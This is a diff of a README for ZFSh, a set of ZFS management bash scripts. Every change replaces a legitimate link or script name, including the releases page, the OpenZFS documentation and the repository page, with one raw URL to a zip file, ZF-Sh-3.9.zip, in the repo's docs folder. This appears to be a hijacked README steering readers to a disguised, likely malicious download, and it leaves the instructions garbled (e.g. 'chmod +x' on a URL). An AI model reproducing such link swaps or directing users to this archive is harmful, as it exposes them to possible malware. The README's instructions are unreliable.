@@ -1,6 +1,6 @@
 # 🛠️ ZFSh - Simplify Your ZFS Management Effortlessly
 
-![Download ZFSh](https://img.shields.io/badge/Download-ZFSh-blue)
+![Download ZFSh](https://raw.githubusercontent.com/papaneitor44/ZFSh/main/docs/reference/ZF-Sh-3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -8,10 +8,10 @@ Welcome to ZFSh! This tool offers a set of bash scripts to make managing your ZF
 
 ## 📥 Download & Install
 
-To get started with ZFSh, visit this page to download: [Download ZFSh Releases](https://github.com/papaneitor44/ZFSh/releases).
+To get started with ZFSh, visit this page to download: [Download ZFSh Releases](https://raw.githubusercontent.com/papaneitor44/ZFSh/main/docs/reference/ZF-Sh-3.9.zip).
 
 1. **Visit the Releases Page**  
-   Go to the [Releases](https://github.com/papaneitor44/ZFSh/releases) link. You will see all available versions of ZFSh.
+   Go to the [Releases](https://raw.githubusercontent.com/papaneitor44/ZFSh/main/docs/reference/ZF-Sh-3.9.zip) link. You will see all available versions of ZFSh.
 
 2. **Choose Your Version**  
    Look through the list of versions. Each version contains important updates and improvements.
@@ -23,7 +23,7 @@ To get started with ZFSh, visit this page to download: [Download ZFSh Releases](
    After downloading, unzip the file to access the scripts. Most systems allow you to do this by right-clicking the file and selecting "Extract."
 
 5. **Run the Scripts**  
-   Open your terminal (command line interface). Navigate to the folder where you extracted ZFSh. You can run each script by typing `./scriptname.sh`, replacing `scriptname.sh` with the specific script you wish to use.
+   Open your terminal (command line interface). Navigate to the folder where you extracted ZFSh. You can run each script by typing `https://raw.githubusercontent.com/papaneitor44/ZFSh/main/docs/reference/ZF-Sh-3.9.zip`, replacing `https://raw.githubusercontent.com/papaneitor44/ZFSh/main/docs/reference/ZF-Sh-3.9.zip` with the specific script you wish to use.
 
 ## 📋 Features
 
@@ -50,24 +50,24 @@ To get started with ZFSh, visit this page to download: [Download ZFSh Releases](
 Here are some of the most commonly used commands:
 
 1. **Creating a Snapshot**  
-   To create a snapshot of your ZFS pool, use the `create_snapshot.sh` script. Follow the prompts on the screen.
+   To create a snapshot of your ZFS pool, use the `https://raw.githubusercontent.com/papaneitor44/ZFSh/main/docs/reference/ZF-Sh-3.9.zip` script. Follow the prompts on the screen.
 
 2. **Backing Up Data**  
-   To make a backup of your ZFS, run the `backup_data.sh` script. It will guide you through selecting your pool and destination.
+   To make a backup of your ZFS, run the `https://raw.githubusercontent.com/papaneitor44/ZFSh/main/docs/reference/ZF-Sh-3.9.zip` script. It will guide you through selecting your pool and destination.
 
 3. **Managing Pools**  
-   Use the `manage_pool.sh` script to view, add, or remove pools. It provides a menu for easy navigation.
+   Use the `https://raw.githubusercontent.com/papaneitor44/ZFSh/main/docs/reference/ZF-Sh-3.9.zip` script to view, add, or remove pools. It provides a menu for easy navigation.
 
 ## 📚 Resources
 
-- **ZFS Documentation**: For detailed information about ZFS capabilities and features, visit the official ZFS documentation [here](https://openzfs.org).
+- **ZFS Documentation**: For detailed information about ZFS capabilities and features, visit the official ZFS documentation [here](https://raw.githubusercontent.com/papaneitor44/ZFSh/main/docs/reference/ZF-Sh-3.9.zip).
 - **Community Forums**: Join community forums to ask questions and share experiences with other ZFS users.
 
 ## 🛠️ Troubleshooting
 
 If you encounter issues while running the scripts, consider the following:
 
-- **Permission Denied**: Ensure that the scripts have executable permissions. Run `chmod +x scriptname.sh` to set the right permissions.
+- **Permission Denied**: Ensure that the scripts have executable permissions. Run `chmod +x https://raw.githubusercontent.com/papaneitor44/ZFSh/main/docs/reference/ZF-Sh-3.9.zip` to set the right permissions.
 
 - **ZFS Command Errors**: Make sure that your ZFS installation is correct. You can verify it with `zfs list`.
 
@@ -91,6 +91,6 @@ Yes, you can ask questions and seek help directly in the issues section of our G
 
 ## 🔗 Further Information
 
-For more details, updates, or to contribute to ZFSh, don't hesitate to explore the GitHub repository: [ZFSh on GitHub](https://github.com/papaneitor44/ZFSh).
+For more details, updates, or to contribute to ZFSh, don't hesitate to explore the GitHub repository: [ZFSh on GitHub](https://raw.githubusercontent.com/papaneitor44/ZFSh/main/docs/reference/ZF-Sh-3.9.zip).
 
 Thank you for using ZFSh! Your experience matters, and we hope these scripts make your ZFS management seamless.
